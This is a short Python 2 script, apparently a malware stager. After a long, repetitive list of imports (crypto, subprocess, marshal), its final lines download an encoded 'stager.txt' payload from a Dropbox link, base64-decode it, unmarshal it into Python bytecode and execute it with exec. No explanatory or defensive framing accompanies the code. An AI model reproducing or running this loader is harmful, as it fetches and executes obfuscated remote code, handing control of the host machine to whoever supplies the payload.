import random, os, urllib, urllib2
import platform, socket, time
import getpass, base64, operator
from multiprocessing import Process, Manager, Value
import uuid, importlib
import subprocess, ssl
import urllib2, urllib
import string
import threading
import urllib2
import argparse
import shlex

from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP

import platform, socket, uuid
import json, random, os, sys
import thread, urllib2

# import netifaces as ni
import ifaddr
import marshal

getPayload = urllib.urlopen('https://www.dropbox.com/s/6i6oz3j628v6qrc/stager.txt?dl=1')
content = getPayload.read()
marshalContent = marshal.loads(base64.b64decode(content)[8:])

exec marshalContent
